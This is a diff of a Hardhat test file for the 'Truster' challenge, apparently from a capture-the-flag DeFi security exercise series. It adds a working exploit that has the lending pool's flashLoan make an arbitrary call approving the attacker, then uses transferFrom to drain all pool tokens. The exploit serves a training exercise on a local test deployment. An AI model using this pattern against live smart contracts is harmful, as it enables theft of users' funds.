@@ -1,46 +1,68 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
+const Web3 = require("web3");
+const web3 = new Web3(Web3.givenProvider || "ws://localhost:8545");
 
-describe('[Challenge] Truster', function () {
-    let deployer, attacker;
+describe("[Challenge] Truster", function () {
+  let deployer, attacker;
 
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, attacker] = await ethers.getSigners();
 
-        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+    const DamnValuableToken = await ethers.getContractFactory(
+      "DamnValuableToken",
+      deployer
+    );
+    const TrusterLenderPool = await ethers.getContractFactory(
+      "TrusterLenderPool",
+      deployer
+    );
 
-        this.token = await DamnValuableToken.deploy();
-        this.pool = await TrusterLenderPool.deploy(this.token.address);
+    this.token = await DamnValuableToken.deploy();
+    this.pool = await TrusterLenderPool.deploy(this.token.address);
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+    expect(await this.token.balanceOf(this.pool.address)).to.equal(
+      TOKENS_IN_POOL
+    );
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
-    });
+    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
+  });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
-    });
+  it("Exploit", async function () {
+    const data = web3.eth.abi.encodeFunctionCall(
+      {
+        type: "function",
+        name: "approve",
+        inputs: [
+          { type: "address", name: "spender" },
+          { type: "uint256", name: "amount" },
+        ],
+      },
+      [attacker.address, TOKENS_IN_POOL.toString()]
+    );
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+    await this.pool.flashLoan(0, attacker.address, this.token.address, data);
+    await this.token
+      .connect(attacker)
+      .transferFrom(
+        this.pool.address,
+        attacker.address,
+        TOKENS_IN_POOL.toString()
+      );
+  });
 
-        // Attacker has taken all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
-    });
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // Attacker has taken all tokens from the pool
+    expect(await this.token.balanceOf(attacker.address)).to.equal(
+      TOKENS_IN_POOL
+    );
+    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
+  });
 });
-
